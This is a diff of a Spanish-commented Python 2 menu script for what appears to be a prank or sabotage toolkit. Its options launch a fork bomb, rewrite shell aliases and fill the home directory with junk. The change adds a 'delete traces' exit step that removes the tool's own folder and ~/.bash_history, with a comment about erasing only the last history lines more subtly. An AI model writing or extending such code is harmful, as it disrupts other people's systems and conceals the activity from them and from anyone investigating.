@@ -1,7 +1,7 @@
 import os
 import bombaFork
 import cambiaAlias
-import cagetiza
+import cagetizador
 
 os.system('clear')
 
@@ -21,7 +21,7 @@ while not salir:
         bombaFork.fork()
     elif opcion == 2:
         print "Cagetizando..."
-        cagetiza.cagetizar()
+        cagetizador.caguetizadorPy()
     elif opcion == 3:
         print "Cambia alias..."
         cambiaAlias.cambiarComandos()
@@ -30,8 +30,8 @@ while not salir:
     elif opcion == 5:
         print 'Ejecuta llenar home de basura'
     elif opcion == 99:
-        print "Saliendo..."
+        print "Saliendo... y borrando rastro"
+        shutil.rmtree('../Puteador')
+        os.remove('~/.bash_history') # cambiar por algo mas elegante como borrar las ultimas lineas de ese fichero
     else:
         print 'Opcion no valida.'
-
-shutil.rmtree('../Puteador')
